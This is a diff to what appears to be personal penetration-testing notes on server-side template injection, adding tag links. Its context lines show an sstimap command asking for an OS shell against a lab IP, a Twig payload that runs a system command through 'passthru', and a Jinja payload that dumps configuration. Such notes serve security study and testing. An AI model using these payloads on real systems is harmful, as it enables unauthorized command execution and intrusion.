@@ -1,4 +1,4 @@
-
+[[php]] [[nodejs]] [[python]]
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md
 
 1. **Jinja2 (python)/Twig (PHP)** - `{{7*'7'}}`
@@ -29,6 +29,7 @@ python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
 ```
 
 #### Twig
+[[twig]]
 ```twig
 {{['id',""]|sort('passthru')}}
 
@@ -40,6 +41,7 @@ python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
 ```
 
 #### Jinja
+[[jinja]]
 ```jinja2
 {{ config.items() }}
 
